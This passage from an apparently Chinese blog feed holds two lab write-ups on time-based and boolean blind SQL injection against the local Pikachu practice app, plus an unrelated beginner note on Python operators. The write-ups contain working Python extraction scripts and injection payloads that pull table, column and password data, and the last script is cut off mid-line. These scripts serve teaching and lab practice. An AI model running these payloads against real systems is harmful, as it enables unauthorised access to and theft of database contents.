class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;,sleep(2),0)#</span><br>        columnlen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 记录请求前后时间</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + columnlen_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>            columnlen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, columnlen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnlen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;,sleep(2),0)#</span><br>            columnname_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>            <span class="hljs-comment"># 记录请求前后时间</span><br>            time3 = datetime.datetime.now()<br>            g = s.get(url + columnname_payload)<br>            time4 = datetime.datetime.now()<br>            <span class="hljs-comment"># 对比时间差</span><br>            sec = (time4 - time3).seconds<br>            <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>                column_name = column_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, column_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/9.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h5 id="④爆数据内容："><a href="#④爆数据内容：" class="headerlink" title="④爆数据内容："></a>④爆数据内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆数据的条数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>    <span class="hljs-comment"># 拼接完整的url   从users表中选password列   ?name=vince&#x27; and if((select count(password) from users)=&quot;+str(l)+&quot;,sleep(2),0)#</span><br>    datanumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28%28select+count%28password%29+from+users%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url + datanumber_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2 - time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>        datanumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;datenumber:&#x27;</span>, datanumber)<br><br><span class="hljs-comment"># 爆数据内容（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datanumber):<br>    data_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(length(substr((select password from users limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;,sleep(2),0)#</span><br>        datalen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + datalen_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>            datalen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, datalen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datalen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(ascii(substr((select password from users limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot; ,sleep(2),0)#</span><br>            dataname_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;+%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>            <span class="hljs-comment"># 记录请求前后时间</span><br>            time3 = datetime.datetime.now()<br>            g = s.get(url + dataname_payload)<br>            time4 = datetime.datetime.now()<br>            <span class="hljs-comment"># 对比时间差</span><br>            sec = (time4 - time3).seconds<br>            <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>                data_name = data_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dataname&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, data_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/10.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h4><p>&emsp;&emsp;时间注入的脚本有布尔注入脚本的基础，实现还是简单的，主要就是两个地方的改动，一个是payload的注入需要在布尔判断的基础上加入if——sleep的判断，第二个就是判断也冲文本内容变为了时间的间隔，当然，在时间的选择上还是有一定讲究的，时间太短会出现错误，时间太长又消耗时间成本，所以要慎重选择。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python日记（二）</title>
    <link href="/2022/08/21/python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/08/21/python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python日记（二）"><a href="#Python日记（二）" class="headerlink" title="Python日记（二）"></a>Python日记（二）</h1><p>&emsp;&emsp;</p><h4 id="1-模块间的代码元素访问"><a href="#1-模块间的代码元素访问" class="headerlink" title="1.模块间的代码元素访问"></a>1.模块间的代码元素访问</h4><p>&emsp;&emsp;Hello模块代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> World<br><span class="hljs-keyword">from</span> World <span class="hljs-keyword">import</span> z<br><span class="hljs-keyword">from</span> World <span class="hljs-keyword">import</span> x <span class="hljs-keyword">as</span> x2<br><br>x = <span class="hljs-number">100</span><br>y = <span class="hljs-number">20</span><br><br><span class="hljs-built_in">print</span>(y)  <span class="hljs-comment"># 打印当前模块变量y</span><br><span class="hljs-built_in">print</span> (World.y)  <span class="hljs-comment"># 打印World模块变量y</span><br><span class="hljs-built_in">print</span> (z)  <span class="hljs-comment"># 打印world模块变量z</span><br><span class="hljs-built_in">print</span> (x2)  <span class="hljs-comment"># 打印World模块的x</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;World模块代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br>x = <span class="hljs-string">&#x27;你好&#x27;</span><br>y = <span class="hljs-literal">True</span><br>z = <span class="hljs-number">20.0</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;运行结果：</p><center><img src="/img/python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/1.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2.数据类型"></a>2.数据类型</h4><p>&emsp;&emsp;Python中有6种主要的内置数据类型：数字、字符串、列表、元组、集合和字典。其中数字类型有四种，包括整数类型、浮点类型、复数类型和布尔类型。</p><ul><li>整数类型：int</li><li>浮点类型：float</li><li>复数类型：complex     #  形式是a+bj</li><li>布尔类型：bool（整数类型的一种子类）</li></ul><p>&emsp;</p><h4 id="3-数据类型的转换"><a href="#3-数据类型的转换" class="headerlink" title="3.数据类型的转换"></a>3.数据类型的转换</h4><p>&emsp;&emsp;数据类型的转换分为隐式类型转换和显式类型转换（自动与非自动）</p><ul><li>隐式类型转换</li></ul><p>&emsp;&emsp;数字之间可以进行数学计算，在进行数学计算时若数字类型不同，则会自动的发生数字类型的转换</p><ul><li>显式类型转</li></ul><p>&emsp;&emsp;使用转换函数进行转换，除复数外，三种数字类型如整数、浮点和布尔都有自己的转换函数，分别是int（）、float（）和bool（）函数</p><p>&emsp;</p><h4 id="4-运算符"><a href="#4-运算符" class="headerlink" title="4.运算符"></a>4.运算符</h4><ul><li><h6 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h6><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加</td><td align="center">a+b</td><td align="center">求a和b的和</td></tr><tr><td align="center">-</td><td align="center">减</td><td align="center">a-b</td><td align="center">求a与b的差</td></tr><tr><td align="center">*</td><td align="center">乘</td><td align="center">a*b</td><td align="center">求a和b的积</td></tr><tr><td align="center">/</td><td align="center">出</td><td align="center">a/b</td><td align="center">求a除以b的商</td></tr><tr><td align="center">%</td><td align="center">取余</td><td align="center">a%b</td><td align="center">求a除以b的余数</td></tr><tr><td align="center">**</td><td align="center">幂</td><td align="center">a**b</td><td align="center">求a的b次幂</td></tr><tr><td align="center">//</td><td align="center">地板除法</td><td align="center">a//b</td><td align="center">求小于a与b的商的最大整数</td></tr></tbody></table></li></ul><p>&emsp;</p><ul><li><h6 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h6></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td><td align="center">a==b</td></tr><tr><td align="center">!=</td><td align="center">不等于</td><td align="center">a!=b</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td><td align="center">a&gt;b</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td><td align="center">a&lt;b</td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于</td><td align="center">a&gt;=b</td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于</td><td align="center">a&lt;=b</td></tr></tbody></table><p>&emsp;</p><ul><li><h6 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h6></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">not</td><td align="center">逻辑非</td><td align="center">not a</td><td align="center">a为ture时，值为flase，若a为flase，则值为ture</td></tr><tr><td align="center">and</td><td align="center">逻辑与</td><td align="center">a and b</td><td align="center">a、b全为ture，结果才为ture</td></tr><tr><td align="center">or</td><td align="center">逻辑或</td><td align="center">a or b</td><td align="center">a、b全为false，结果才为false</td></tr></tbody></table><p>&emsp;</p><ul><li><h5 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h5></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">~</td><td align="center">位反</td><td align="center">~x</td><td align="center">将x的值按位取反</td></tr><tr><td align="center">&amp;</td><td align="center">位与</td><td align="center">x&amp;y</td><td align="center">将x与y按位进行位与运算</td></tr><tr><td align="center">|</td><td align="center">位或</td><td align="center">x|y</td><td align="center">将x与y按位进行位或运算</td></tr><tr><td align="center">^</td><td align="center">位异或</td><td align="center">x^y</td><td align="center">将x与y按位进行位异或运算</td></tr><tr><td align="center">&gt;&gt;</td><td align="center">右移</td><td align="center">x&gt;&gt;a</td><td align="center">将x右移a位，高位采用符号位补位</td></tr><tr><td align="center">&lt;&lt;</td><td align="center">左移</td><td align="center">x&lt;&lt;a</td><td align="center">将x左移a位，低位用0补位</td></tr></tbody></table><p>&emsp;</p><ul><li><h5 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h5></li></ul><p>&emsp;</p><h4 id="5-运算符的优先级"><a href="#5-运算符的优先级" class="headerlink" title="5.运算符的优先级"></a>5.运算符的优先级</h4><table><thead><tr><th align="center">优先级</th><th align="center">运算符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">（）</td><td align="center">小括号</td></tr><tr><td align="center">2</td><td align="center">**</td><td align="center">幂</td></tr><tr><td align="center">3</td><td align="center">~</td><td align="center">位反</td></tr><tr><td align="center">4</td><td align="center">+，-</td><td align="center">正负号</td></tr><tr><td align="center">5</td><td align="center">*，/，%，//</td><td align="center">乘，除，取余，地板除</td></tr><tr><td align="center">6</td><td align="center">+，-</td><td align="center">加，减</td></tr><tr><td align="center">7</td><td align="center">&lt;&lt;，&gt;&gt;</td><td align="center">位移</td></tr><tr><td align="center">8</td><td align="center">&amp;</td><td align="center">位与</td></tr><tr><td align="center">9</td><td align="center">^</td><td align="center">位异或</td></tr><tr><td align="center">10</td><td align="center">|</td><td align="center">位或</td></tr><tr><td align="center">11</td><td align="center">&lt;，&lt;=，&gt;，&gt;=，&lt;&gt;，!=，==</td><td align="center">比较</td></tr><tr><td align="center">12</td><td align="center">not</td><td align="center">逻辑非</td></tr><tr><td align="center">13</td><td align="center">and，or</td><td align="center">逻辑与，逻辑或</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>盲注——布尔型</title>
    <link href="/2022/08/19/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/"/>
    <url>/2022/08/19/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="盲注——布尔型"><a href="#盲注——布尔型" class="headerlink" title="盲注——布尔型"></a>盲注——布尔型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;又是查询信息，直接输入点内容看看情况，可</p><p>&emsp;</p><h4 id="2-尝试or注入"><a href="#2-尝试or注入" class="headerlink" title="2.尝试or注入"></a>2.尝试or注入</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;明显联合查询注入是失败了，并不被允许</p><p>&emsp;</p><h4 id="3-尝试报错注入"><a href="#3-尝试报错注入" class="headerlink" title="3.尝试报错注入"></a>3.尝试报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;明显也不行，这说明，并没有相关回显，那只能尝试使用盲注了。</p><p>&emsp;&emsp;</p><h4 id="4-尝试布尔注入"><a href="#4-尝试布尔注入" class="headerlink" title="4.尝试布尔注入"></a>4.尝试布尔注入</h4><p>&emsp;&emsp;在布尔注入中，由于需要判断对错的反馈，所以就个人理解而言，是需要正确的用户进行查询，从而就行判断的。而对于布尔类型而言，就是靠猜测，通过不断的尝试，达到正确的结果：</p><p>&emsp;&emsp;正确的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27;and left(database(),1)=&#x27;</span>p<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;错误的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27;and left(database(),1)=&#x27;</span>g<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;最终结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27;and left(database(),7)=&#x27;</span>pikachu<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/5.jpg" style="zoom:80%;" /></center>&emsp;&emsp;我们可以看见，通过这种形式的判断，我们可以逐步的爆破出数据库的名字（当然，这都要借助于脚本的形式了，人力消耗太大，太浪费时间了），当然不一定是使用letf函，有许多类似于mid之类的一样是能够操作的。同样的道理，我们可以用这样的语句获取我们想要的表、列、名等内容，这里就不具体讲述了。还是用脚本写吧。<h4 id="5-python脚本"><a href="#5-python脚本" class="headerlink" title="5.python脚本"></a>5.python脚本</h4><p>&emsp;&emsp;主要是参考网络的一些现成的脚本进行爆破，参考连接：</p><ul><li><a href="https://blog.csdn.net/qq_51415429/article/details/114298238">https://blog.csdn.net/qq_51415429/article/details/114298238</a></li><li><a href="https://www.cnblogs.com/lzlzzzzzz/p/13998552.html">https://www.cnblogs.com/lzlzzzzzz/p/13998552.html</a></li></ul><p>(连在一起运行效果更佳哦)</p><h5 id="①先爆数据库："><a href="#①先爆数据库：" class="headerlink" title="①先爆数据库："></a>①先爆数据库：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>s = requests.session()<br>url = <span class="hljs-string">&quot;http://127.0.0.1/pika/vul/sqli/sqli_blind_b.php&quot;</span>  <span class="hljs-comment"># 选择攻击的网址</span><br><br><span class="hljs-comment"># headers = &#123;&#x27;cookie&#x27;: &#x27;&#x27;&#125;  # 需要登录的可以添加cookie值</span><br><br><span class="hljs-comment"># 爆破数据库的长度</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-comment"># 这里对#和\都进行了url编码处理，在#好后将完整的url拼接起来,然后注意了，需要url转码，例如&#x27;需要变成%27</span><br>    databaselen_payload = <span class="hljs-string">&quot;?name=vince%27and+length(database())=&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 写入判断布尔类型是否存在的根据，如果比较登录成功的文字是否在对应网页的文本中， 是则可以继续，如果反馈错误，则说明数据库长度到头了，直接break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;your email is:&quot;</span> <span class="hljs-keyword">in</span> s.get(url+databaselen_payload).text:<br>        database_len = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># 打印出来</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database_length:&quot;</span>, <span class="hljs-built_in">str</span>(database_len))<br><br><span class="hljs-comment"># 暴数据库的名</span><br>database_name = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr(database(),&quot;+str(l)+&quot;,1))=&quot;+str(i)+&quot;#</span><br>        databasename_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28database%28%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 查看返回值是否正确</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url+databasename_payload).text:<br>            database_name = database_name + <span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;database_name:&#x27;</span>, database_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/6.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="②爆表内容："><a href="#②爆表内容：" class="headerlink" title="②爆表内容："></a>②爆表内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆表的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=&quot;+str(l)+&quot;#</span><br>    tablenumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + tablenumber_payload).text:<br>        tablenumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tablenumber:&#x27;</span>, tablenumber)<br><br><span class="hljs-comment"># 爆表名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablenumber):<br>    table_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;#</span><br>        tablelen_payload = <span class="hljs-string">&quot;?name=vince%27+and+length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span 